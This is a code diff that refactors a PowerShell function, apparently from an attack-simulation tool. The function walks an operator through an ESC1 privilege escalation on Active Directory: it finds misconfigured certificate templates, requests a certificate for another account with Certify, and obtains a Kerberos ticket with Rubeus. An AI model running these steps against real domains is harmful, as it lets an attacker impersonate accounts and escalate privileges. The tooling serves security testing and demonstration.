@@ -43,73 +43,75 @@ function Invoke-PrivilegeEscalationViaESC1 {
     Update-WindowTitle -NewTitle $Script:Phase25
     Set-ASConfig -Setting "LastStage" -Value $Script:Phase25
 
-    Do {
+
+    If (-not $SkipClearHost) { Clear-Host }
+
+    Write-AS2GoOutput -Type  Header -M "Exploiting Misconfigured Certificate Templates (ESC1)"
+    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
+
+    # http://attack.mitre.org/techniques/T1649/
+    # certutil -config "ROOT-DC19-01.WS19-ROOT.CORP\WS19-ROOT" -crl "http://root-dc19-01.ws19-root.corp/certsrv/mscep_admin.crl" -verify "mscep_admin.crt"
+
+    $promptParams = @{}
+    if ($safemode) {
+        $promptParams.Options = @(
+            [pscustomobject]@{
+                Label = '&Skip'
+                Help  = 'Skip this step in Safe Mode'
+                Value = $Script:No
+            }
+        )
+    }
+    $answer = Show-DecisionPrompt @promptParams
+
+    If ($answer -eq $Script:Yes) {
+
         If (-not $SkipClearHost) { Clear-Host }
+        Write-AS2GoOutput -Type Header -Message "Step 1 - Identify Misconfigured and (!) Published Certificate Templates"
+        $Functionality = "Checks for published certificate templates vulnerable to ESC1."
+        Write-AS2GoOutput -Type H1 -Message $Functionality  
+        $CATemplate = Get-VulnerableCertificateTemplate
 
-        Write-AS2GoOutput -Type  Header -M "Exploiting Misconfigured Certificate Templates (ESC1)"
-        Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
-
-        # http://attack.mitre.org/techniques/T1649/
-        # certutil -config "ROOT-DC19-01.WS19-ROOT.CORP\WS19-ROOT" -crl "http://root-dc19-01.ws19-root.corp/certsrv/mscep_admin.crl" -verify "mscep_admin.crt"
-
-        If ($UnAttended) {
-            $answer = $Script:No
-        }
-        else {
-            $question = "Do you want to run this attack - Y or N? Default "
-            $answer = Get-Answer -question $question -defaultValue $Script:Yes
-        }
-
-        If ($answer -eq $Script:Yes) {
-
+        Do {
             If (-not $SkipClearHost) { Clear-Host }
-            Write-AS2GoOutput -Type Header -Message "Step 1 - Identify Misconfigured and (!) Published Certificate Templates"
-            $Functionality = "Checks for published certificate templates vulnerable to ESC1."
-Write-AS2GoOutput -Type H1 -Message $Functionality  
-            $CATemplate = Get-VulnerableCertificateTemplate
-
-            Do {
-                If (-not $SkipClearHost) { Clear-Host }
                 
-                $AlternativeAccountDN = Set-AlternativeAccount
-                $AlternativeAccount = Get-ADUserDetails -SearchByDN -Identifier $AlternativeAccountDN
+            $AlternativeAccountDN = Set-AlternativeAccount
+            $AlternativeAccount = Get-ADUserDetails -SearchByDN -Identifier $AlternativeAccountDN
                 
-                If (-not $UnAttended) { pause }
-                If (-not $SkipClearHost) { Clear-Host }
-                Write-AS2GoOutput -Type Header -Message "Step 3 - Request Certificate with Certify"
-                $Functionality = "Request a certificate from the vulnerable template by specifying the`n    target account as UPN and SID in the certificate request."
-Write-AS2GoOutput -Type H1 -Message $Functionality
-                Write-AS2GoOutput -Type  Bullet -Message "Request a certificate from the vulnerable template by specifying the`n    target account as UPN and SID in the certificate request."
+            If (-not $UnAttended) { pause }
+            If (-not $SkipClearHost) { Clear-Host }
+            Write-AS2GoOutput -Type Header -Message "Step 3 - Request Certificate with Certify"
+            $Functionality = "Request a certificate from the vulnerable template by specifying the`n    target account as UPN and SID in the certificate request."
+            Write-AS2GoOutput -Type H1 -Message $Functionality
+            Write-AS2GoOutput -Type  Bullet -Message "Request a certificate from the vulnerable template by specifying the`n    target account as UPN and SID in the certificate request."
 
-                $PfxBase64 = Request-PfxWithCertify  -Certificate  $CAtemplate -AlternativeAccount $AlternativeAccount
+            $PfxBase64 = Request-PfxWithCertify  -Certificate  $CAtemplate -AlternativeAccount $AlternativeAccount
                 
-                $question = "Would you like to repeat this attack phase? Please enter Y or N. Default "
-                $repeat = Get-Answer -question $question -defaultValue $Script:No
+            $question = "Would you like to repeat this attack phase? Please enter Y or N. Default "
+            $repeat = Get-Answer -question $question -defaultValue $Script:No
 
-            } Until ($repeat -eq $Script:No)
+        } Until ($repeat -eq $Script:No)
 
-            Do {
-                If (-not $SkipClearHost) { Clear-Host }
+        Do {
+            If (-not $SkipClearHost) { Clear-Host }
 
-                Write-AS2GoOutput -Type Header -Message "Step 4 - Request a Ticket Granting Ticket (TGT) with Rubeus"
-                Write-AS2GoOutput -Type  H1 -Message "Now we can request a TGT for the user for which we minted the new certificate."
-                Request-TGTWithRubeus -pfxFile $PfxBase64 -AlternativeAccount $AlternativeAccount
+            Write-AS2GoOutput -Type Header -Message "Step 4 - Request a Ticket Granting Ticket (TGT) with Rubeus"
+            Write-AS2GoOutput -Type  H1 -Message "Now we can request a TGT for the user for which we minted the new certificate."
+            Request-TGTWithRubeus -pfxFile $PfxBase64 -AlternativeAccount $AlternativeAccount
 
-                $question = "Would you like to repeat this attack phase? Please enter Y or N. Default "
-                $repeat = Get-Answer -question $question -defaultValue $Script:No
+            $question = "Would you like to repeat this attack phase? Please enter Y or N. Default "
+            $repeat = Get-Answer -question $question -defaultValue $Script:No
 
-            } Until ($repeat -eq $Script:No)
+        } Until ($repeat -eq $Script:No)
 
-        } ##
-        else {
-            return
-        }
+    } ##
+    else {
+        return
+    }
 
-        If (-not $SkipClearHost) { Clear-Host }
+    If (-not $SkipClearHost) { Clear-Host }
 
-        Write-AS2GoOutput -Type  Header -M "??? REPEAT | Exploiting Misconfigured Certificate Templates (ESC1) ???"
 
-    } Until ($repeat -eq $Script:No)
 
     Measure-FunctionRuntime -End -Details $Info
 }
